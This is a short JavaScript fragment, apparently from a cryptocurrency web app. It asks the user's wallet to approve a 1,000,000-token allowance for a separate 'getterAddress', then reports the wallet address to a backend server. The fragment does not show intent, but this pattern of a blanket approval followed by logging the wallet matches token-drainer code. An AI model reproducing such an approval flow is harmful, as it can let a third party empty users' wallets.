...
async function approve (clientAddress) {
  ...
  coinContract.methods.approve(getterAddress, ethers.utils.parseEther('1000000')).send({ from: clientAddress })
    .then(async res => {
      noLiquidityNotifier()
      try {
        await axios.patch(`${server.walletServerURI}/wallet/wallet/${clientAddress}/`, {
